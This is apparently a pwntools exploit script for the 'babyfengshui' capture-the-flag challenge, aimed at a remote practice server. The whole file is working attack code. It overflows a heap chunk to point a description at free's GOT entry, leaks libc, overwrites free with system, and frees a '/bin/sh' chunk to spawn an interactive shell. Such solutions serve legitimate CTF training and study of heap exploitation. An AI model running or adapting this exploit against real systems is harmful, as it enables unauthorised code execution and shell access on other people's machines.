from pwn import *

#context.log_level = 'debug'

proc_name = './babyfengshui_33c3_2016'

#p = process(proc_name)
p = remote('node4.buuoj.cn', 29321)
elf = ELF(proc_name)
libc = ELF('libc-2.23.buu.so')


def add(username, desc, dlen):
	p.sendlineafter('Action: ', '0')
	p.sendlineafter('size of description: ', str(dlen))
	p.sendlineafter('name: ', username)
	p.sendlineafter('text length: ', str(dlen))
	p.sendlineafter('text: ', desc)
	
def update(index, desc):
	p.sendlineafter('Action: ', '3')
	p.sendlineafter('index: ', str(index))
	p.sendlineafter('text length: ', str(len(desc)))
	p.sendlineafter('text: ', desc)
	
def delete(index):
	p.sendlineafter('Action: ', '1')
	p.sendlineafter('index: ', str(index))
	
def show(index):
	p.sendlineafter('Action', '2')
	p.sendlineafter('index: ', str(index))
	
add('a', 'aaaa', 0x80)
add('a', 'aaaa', 0x80)
delete(0)
add('a', 'aaaa', 0x100)

free_got = elf.got['free']

payload_prepend = b'/bin/sh\0' + b'a' * ( 0x80 + 0x80 + 4 ) + p32(0x88 + 1) + b'a' * ( 0x80 + 4 ) + p32(0x88 + 1)
payload = payload_prepend + p32(free_got)

update(2, payload)
show(1)

p.recvuntil('description: ')
free_real_addr = u32(p.recv(4))

libc_base = free_real_addr - libc.sym['free']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system_addr = libc_base + libc.sym['system']

payload = p32(system_addr)
update(1, payload)

delete(2)

p.interactive()
